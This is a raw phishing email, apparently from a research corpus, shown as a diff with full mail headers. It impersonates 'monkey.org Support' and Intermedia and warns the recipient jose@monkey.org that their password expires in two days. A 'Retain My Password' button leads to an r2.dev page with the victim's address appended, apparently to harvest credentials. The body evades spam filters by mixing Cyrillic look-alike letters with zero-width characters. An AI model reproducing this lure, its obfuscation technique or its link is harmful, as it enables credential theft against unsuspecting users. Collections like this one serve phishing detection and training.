@@ -1,0 +1,191 @@
+From jose@monkey.org Thu Oct  5 12:05:32 2023 +0000
+Return-Path: admin@decomotivesecuresercive.store
+Delivered-To: jose@monkey.org
+X-FDA: 81311278104.38.E5A3DCE
+Received: from mail.decomotivesecuresercive.store (mail.decomotivesecuresercive.store [193.203.169.187])
+	by imf30.b.hostedemail.com (Postfix) with ESMTP id 9377A180011
+	for <jose@monkey.org>; Thu,  5 Oct 2023 12:05:30 +0000 (UTC)
+Authentication-Results: imf30.b.hostedemail.com;
+	dkim=pass header.d=decomotivesecuresercive.store header.s=3C6D6740-5D84-11EE-AA7B-4096F2071D08 header.b=wDJOeZ7c;
+	dmarc=pass (policy=none) header.from=decomotivesecuresercive.store;
+	spf=pass (imf30.b.hostedemail.com: domain of admin@decomotivesecuresercive.store designates 193.203.169.187 as permitted sender) smtp.mailfrom=admin@decomotivesecuresercive.store
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1696507530;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=eflRHB/Fta6+Ok0rrS6J1dUyizduesCHNfLe/hJSX6Y=;
+	b=hcaSbKQNDLiTkpkPmK1gbZbmR3L3I2NGLy9PqcgpIkuXrty70F7K0tVlLGkwXc2x9YyctM
+	0aqvOIwFsYERIxiFr87eKBiF0lYsE/li6/Njz6sr4w7bFVw+QPSrrN4mmzIdrv6gdJ72O7
+	aY9wnGP/WhMPUpgADiw7zvASSSQG5dU=
+ARC-Authentication-Results: i=1;
+	imf30.b.hostedemail.com;
+	dkim=pass header.d=decomotivesecuresercive.store header.s=3C6D6740-5D84-11EE-AA7B-4096F2071D08 header.b=wDJOeZ7c;
+	dmarc=pass (policy=none) header.from=decomotivesecuresercive.store;
+	spf=pass (imf30.b.hostedemail.com: domain of admin@decomotivesecuresercive.store designates 193.203.169.187 as permitted sender) smtp.mailfrom=admin@decomotivesecuresercive.store
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1696507530; a=rsa-sha256;
+	cv=none;
+	b=HTUrlB2x1Xg3BaPCuPSYF2t2uZ01pRtBNUzRgm10N5GnsanhuOILBXFCJ8q81YOBCOvYLP
+	Fcx6jhpcZJhlLd865+Wf1gTplqv2IyNImKzufJdVlT/yLrtW9wfaVNffB4a9aQH6ek4PSY
+	09rT4AAITUJwsgEq/9UPSU0iM7MULSA=
+Received: from localhost (localhost.localdomain [127.0.0.1])
+	by mail.decomotivesecuresercive.store (Postfix) with ESMTP id 579473D23F6C
+	for <jose@monkey.org>; Thu,  5 Oct 2023 11:54:39 +0000 (UTC)
+Received: from mail.decomotivesecuresercive.store ([127.0.0.1])
+	by localhost (mail.decomotivesecuresercive.store [127.0.0.1]) (amavisd-new, port 10032)
+	with ESMTP id 0g0u4l3lTVVn for <jose@monkey.org>;
+	Thu,  5 Oct 2023 11:54:38 +0000 (UTC)
+Received: from localhost (localhost.localdomain [127.0.0.1])
+	by mail.decomotivesecuresercive.store (Postfix) with ESMTP id 42F623C0FDD9
+	for <jose@monkey.org>; Thu,  5 Oct 2023 11:13:17 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.10.3 mail.decomotivesecuresercive.store 42F623C0FDD9
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+	d=decomotivesecuresercive.store;
+	s=3C6D6740-5D84-11EE-AA7B-4096F2071D08; t=1696504397;
+	bh=eflRHB/Fta6+Ok0rrS6J1dUyizduesCHNfLe/hJSX6Y=;
+	h=From:To:Date:Message-ID:MIME-Version;
+	b=wDJOeZ7cRYCpdKXM66v3WP2jOh1/lXOOMTIiGgyd7Ss2T88e6As+Vzzuu0RFtkbUZ
+	 6LcNjrcYMO+VSUySoEtCM+8EI5vLw+qhLSg5xRni//gZgfpmz51ZHzujou73WzDRAq
+	 m0IoQPPcq5TOf3nvIvlt9WYkkNvIyeI62sq4pBkGmTYH4YoozEhYPrnXOK1nTcYjGr
+	 scCKjZgfxVrHCCuCiejfNvqPI0PZ+e40bBYoRtT5pbd7wrvvgr/AFHUxKXC9bwnNS/
+	 PDzsmQcltWv7xoMFVHhTKL5i/37ducBFGmBN09/aG62yqjuSG3rUnOH2Z3esZJZmIE
+	 lsleJj08WRltA==
+X-Virus-Scanned: amavisd-new at decomotivesecuresercive.store
+Received: from mail.decomotivesecuresercive.store ([127.0.0.1])
+	by localhost (mail.decomotivesecuresercive.store [127.0.0.1]) (amavisd-new, port 10026)
+	with ESMTP id Uh8zxr-3dOHO for <jose@monkey.org>;
+	Thu,  5 Oct 2023 11:13:17 +0000 (UTC)
+Received: from mail.decomotivesecuresercive.store (unknown [109.248.150.225])
+	by mail.decomotivesecuresercive.store (Postfix) with ESMTPSA id 4B1DD3CC279D
+	for <jose@monkey.org>; Thu,  5 Oct 2023 10:27:27 +0000 (UTC)
+From: monkey.org Support<admin@decomotivesecuresercive.store>
+To: jose@monkey.org
+Subject: Closing Down And Deleting Of Your Account In Progress
+Date: 05 Oct 2023 12:27:27 +0200
+Message-ID: <20231005122727.7A2FF2A4BD21B457@decomotivesecuresercive.store>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0012_0B219A9D.A90E9D5E"
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: 9377A180011
+X-Stat-Signature: 7a74re5fzw4gomi7b194kri1mxnu4qqb
+X-Rspam-User: 
+X-Spam-Status: No, score=1.25
+X-HE-Tag: 1696507530-191906
+X-HE-Meta: U2FsdGVkX1/UO5hPWmIdJYevPjp/bnWP767ad/NY3Xw4HuBA6A6RNnkK7/rpGIGt3XnUgOH3ZnrabIOBs5+9Mzq4PRhp/1TPyHNKWs9P0FDK+zmvRXVtrMSx3IOlrAHNB7oitehDQNLT9Mz6E/PT+OXP0xbt7KK/DX5KklJos5KEUL1Oluvje57O+90EF/lz0o8akolujRvqRZ6zjrqVaWLwtvrRCXIKYb6cfvITACH7fWqimCqAj8E1NtfmpVmezrRKNHZB+6x983dsVHZRhNWnwZiEKSCwuSKVM1DmSvi5nI7ZeiuaVnkp8KUIVurMVa3Gr2+2HHoHcYiS40EBbjPKQJK3dy224jo35gN0whnQn0fXZE/vT5kVHLJWU3ktwumuQVf8rKPz/9tMkPo8XrGT8cZEGa1zChqFR23tht570xC+WF4TfPj8zYkEa5CCyB3licoaZhmr5YgAuuuDjqMMNswTzZN2x7NUhQpMCLhwl3ylAdEYUQ==
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 304
+
+
+------=_NextPart_000_0012_0B219A9D.A90E9D5E
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+hi
+------=_NextPart_000_0012_0B219A9D.A90E9D5E
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY style=3D"MARGIN: 0.5em"><PRE style=3D"FONT-SIZE: 15px; WORD-SPACING: =
+0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33,33,33); FONT-STY=
+LE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px=
+; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-s=
+troke-width: 0px; text-decoration-thickness: initial; text-decoration-style=
+: initial; text-decoration-color: initial">
+<TABLE style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 14px; MAX-WIDTH: 680px; =
+FONT-FAMILY: Roboto, sans-serif; BORDER-RIGHT-WIDTH: 0px; WHITE-SPACE: norm=
+al; BORDER-BOTTOM-WIDTH: 0px; BORDER-COLLAPSE: collapse; COLOR: rgb(44,54,5=
+8); BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(244,244,244)" cellSpacing=
+=3D0 cellPadding=3D0 width=3D680 border=3D0><TBODY><TR><TD style=3D'FONT-SI=
+ZE: 16px; FONT-FAMILY: "Helvetica Neue", Helvetica, Arial, sans-serif; COLO=
+R: rgb(51,51,51); MARGIN: 0px' height=3D25 width=3D680>
+Important Security Message</TD></TR><TR><TD style=3D"BORDER-TOP: rgb(232,23=
+2,232) 2px solid; BORDER-RIGHT: rgb(232,232,232) 2px solid; BORDER-BOTTOM: =
+rgb(255,108,44) 2px solid; PADDING-BOTTOM: 20px; PADDING-TOP: 15px; PADDING=
+-LEFT: 0px; BORDER-LEFT: rgb(232,232,232) 2px solid; MARGIN: 0px; PADDING-R=
+IGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255)">
+<TABLE style=3D'FONT-FAMILY: "Helvetica Neue", Helvetica, Arial, sans-serif=
+; BORDER-COLLAPSE: collapse; background-size: initial; background-origin: i=
+nitial; background-clip: initial' cellSpacing=3D0 cellPadding=3D0 width=3D6=
+80 border=3D0><TBODY><TR><TD style=3D"MARGIN: 0px" width=3D15></TD><TD styl=
+e=3D"MARGIN: 0px" width=3D650><TABLE style=3D"BORDER-COLLAPSE: collapse" ce=
+llSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0><TBODY><TR><TD styl=
+e=3D"MARGIN: 0px"><P style=3D"MARGIN-TOP: 0px">
+jose<FONT style=3D'FONT-FAMILY: "Helvetica Neue", Helvetica, Arial, sans-se=
+rif, serif, EmojiFont' size=3D2>,</FONT><BR><BR><FONT style=3D'FONT-FAMILY:=
+ "Helvetica Neue", Helvetica, Arial, sans-serif, serif, EmojiFont' size=3D2=
+>Your&nbsp;</FONT>monkey.org<FONT style=3D'FONT-FAMILY: "Helvetica Neue", H=
+elvetica, Arial, sans-serif, serif, EmojiFont' size=3D2>
+&nbsp;p&#1072;&#65279;&#65279;&#65279;&#65279;ssword is s&#1077;&#65279;&#6=
+5279;&#65279;&#65279;t to &#1077;&#65279;&#65279;&#65279;&#65279;xpire&#652=
+79;&#65279;&#65279;&#65279; in&nbsp;<FONT color=3D#ff0000>2&nbsp;</FONT>d&#=
+1072;&#65279;&#65279;&#65279;&#65279;y</FONT>.<BR><BR>
+&nbsp;&#65279;&#65279;&#65279;&#65279;&nbsp;&#65279;&#65279;&#65279;&#65279=
+;&nbsp;&#65279;&#65279;&#65279;&#65279;&nbsp;&#65279;&#65279;&#65279;&#6527=
+9;&nbsp;&#65279;&#65279;&#65279;&#65279;&nbsp;&#65279;&#65279;&#65279;&#652=
+79;&nbsp;&#65279;&#65279;&#10687;&#65279;&#65279;&#65279;&#65279; &#65279;&=
+#65279;&#65279;&#65279;&nbsp;jose@monkey.org<BR><BR><FONT style=3D'FONT-FAM=
+ILY: "Helvetica Neue", Helvetica, Arial, sans-serif, serif, EmojiFont' size=
+=3D2>
+W&#65279;&#65279;e enc&#1086;&#65279;&#65279;&#65279;&#65279;urage y&#1086;=
+&#65279;&#65279;&#65279;&#65279;u to ta&#65279;&#65279;ke the t&#1110;&#652=
+79;&#65279;&#65279;&#65279;me n&#1086;&#65279;&#65279;&#65279;&#65279;w to =
+Reta&#1110;&#65279;&#65279;&#65279;&#65279;n y&#1086;&#65279;&#65279;&#6527=
+9;&#65279;ur p&#1072;&#65279;&#65279;&#65279;&#65279;ssw&#1086;&#65279;&#65=
+279;&#65279;&#65279;rd&#65279; to avo&#1110;&#65279;&#65279;&#65279;&#65279=
+;d log&#1110;&#65279;&#65279;&#65279;&#65279;n=20
+&#1110;&#65279;&#65279;&#65279;&#65279;nterruption</FONT>.<BR><BR><BR><A st=
+yle=3D'FONT-SIZE: 15px; FONT-FAMILY: "segoe ui light"; BACKGROUND: rgb(38,1=
+12,236); COLOR: rgb(255,255,255); PADDING-BOTTOM: 7px; PADDING-TOP: 7px; PA=
+DDING-LEFT: 7px; PADDING-RIGHT: 7px; text-decoration-line: none' href=3D"ht=
+tps://pub-bdf3591c77b24d918af67ee49479d213.r2.dev/generalnoticeandconfirmno=
+worgetlocked.html#jose@monkey.org" rel=3D"noopener noreferrer" target=3D_bl=
+ank>
+<FONT style=3D'FONT-FAMILY: "Arial Black", serif, EmojiFont'>Retain M&#6527=
+9;y &#1056;&#65279;&#65279;&#1072;&#65279;&#65279;ss&#65279;w&#65279;&#6527=
+9;or&#65279;d</FONT></A></P><P style=3D"MARGIN-TOP: 0px"><FONT style=3D'FON=
+T-FAMILY: "Helvetica Neue", Helvetica, Arial, sans-serif, serif, EmojiFont'=
+ size=3D2><STRONG><BR>Note</STRONG>:&nbsp;<FONT color=3D#ff0000>
+&nbsp;We w&#65279;&#65279;on't b&#1077;&#65279;&#65279;&#65279;&#65279; h&#=
+1077;&#65279;&#65279;&#65279;&#65279;ld respons&#1110;&#65279;&#65279;&#652=
+79;&#65279;bl&#1077;&#65279;&#65279;&#65279;&#65279; for a&#65279;&#65279;&=
+#65279;&#65279;ny &#1072;&#65279;&#65279;&#65279;&#65279;cc&#1086;&#65279;&=
+#65279;&#65279;&#65279;unt l&#1086;&#65279;&#65279;&#65279;&#65279;s&#65279=
+;&#65279;s<BR><BR></FONT>
+For your protection, the server sent this email to all of the contact email=
+ addresses that you associated with your account.&nbsp;If you did not initi=
+ate this request, contact your system administrator</FONT>.</P></TD></TR><T=
+R><TD style=3D"MARGIN: 0px"><DIV style=3D'FONT-SIZE: 12px; BORDER-TOP: rgb(=
+232,232,232) 2px solid; FONT-FAMILY: "Helvetica Neue", Helvetica, Arial, sa=
+ns-serif, serif, EmojiFont; MARGIN-TOP: 5px; COLOR: rgb(102,102,102); PADDI=
+NG-TOP: 5px'>
+<P style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGI=
+N: 5px 0px 0px; PADDING-RIGHT: 0px">This notice is the result of a request =
+made by a computer with the&nbsp;<ABBR title=3D"Internet Protocol" style=3D=
+"BORDER-BOTTOM: 0px; text-decoration-style: initial">IP</ABBR>&nbsp;address=
+ of "127.0.0.1"<BR>through the "cpaneld" service on the server.</P><P style=
+=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 5px 0=
+px 0px; PADDING-RIGHT: 0px"><BR></P></DIV>
+<P style=3D"MARGIN-TOP: 0px"><FONT style=3D'FONT-FAMILY: "Helvetica Neue", =
+Helvetica, Arial, sans-serif, serif, EmojiFont' size=3D2>You can disable th=
+e "lntermedia Account Password" type of notification through the interface<=
+/FONT></P><P style=3D"MARGIN-TOP: 0px"><FONT style=3D'FONT-FAMILY: "Helveti=
+ca Neue", Helvetica, Arial, sans-serif, serif, EmojiFont' size=3D2>Do not r=
+eply to this automated message.</FONT></P></TD></TR></TBODY></TABLE></TD><T=
+D style=3D"MARGIN: 0px" width=3D15></TD></TR></TBODY></TABLE></TD>
+</TR><TR><TD style=3D"PADDING-TOP: 10px; MARGIN: 0px" align=3Dcenter><P sty=
+le=3D'FONT-SIZE: 12px; FONT-FAMILY: "Helvetica Neue", Helvetica, Arial, san=
+s-serif; COLOR: rgb(102,102,102); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px'><BR>Copyright&copy;&nbsp;=
+2023 Intermedia Cloud communications, L.L.C.</P></TD></TR></TBODY></TABLE><=
+/PRE></BODY></HTML>
+------=_NextPart_000_0012_0B219A9D.A90E9D5E--
